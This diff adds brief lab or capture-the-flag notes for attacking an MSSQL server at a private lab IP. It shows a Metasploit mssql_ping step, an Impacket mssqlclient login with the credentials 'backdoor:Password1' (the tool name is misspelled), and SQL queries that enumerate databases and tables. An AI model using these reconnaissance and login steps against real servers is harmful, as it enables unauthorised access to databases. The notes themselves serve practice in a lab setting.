@@ -1,0 +1,11 @@
+target: 10.129.111.216
+
+Metasploit mssql_ping set rhost <ip>
+
+mpacket-mssqlclient backdoor:Password1@10.129.111.216 -windows-auth
+
+once connected:
+SELECT name, database_id, create_date  FROM sys.databases;
+
+SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'
+
